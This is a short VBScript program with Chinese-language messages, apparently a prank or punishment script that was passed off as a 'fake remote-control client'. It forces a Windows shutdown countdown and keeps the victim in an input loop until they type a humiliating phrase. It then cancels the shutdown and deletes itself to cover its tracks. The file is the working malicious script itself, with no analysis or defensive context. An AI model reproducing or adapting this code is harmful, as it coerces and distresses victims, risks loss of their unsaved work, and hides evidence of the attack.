On Error Resume Next
Dim WSHshellA
dim fso,f
Set WSHshellA = wscript.CreateObject("wscript.shell")
set fso = createobject("scripting.filesystemobject")
WSHshellA.run "cmd.exe /c shutdown -s -t 60 -c ""拒绝就让你一分钟内关机,差一个字都不行,这事mou的商量！"" ", 0, True
Dim a
Do While (a <> "你真东西")
a = InputBox("输入.你真东西.输入框,", "你真东西", "心高气傲我拒绝", 8000, 7000)
MsgBox Chr(13) + Chr(13) + Chr(13) + a, 0, "伪装伪控端"
Loop
MsgBox Chr(13) + Chr(13) + Chr(13) + "这是你用伪控端不给钱的报应,你真东西!"
WSHshella.run "cmd.exe /c shutdown -a"
f = fso.deletefile(wscript.scriptname)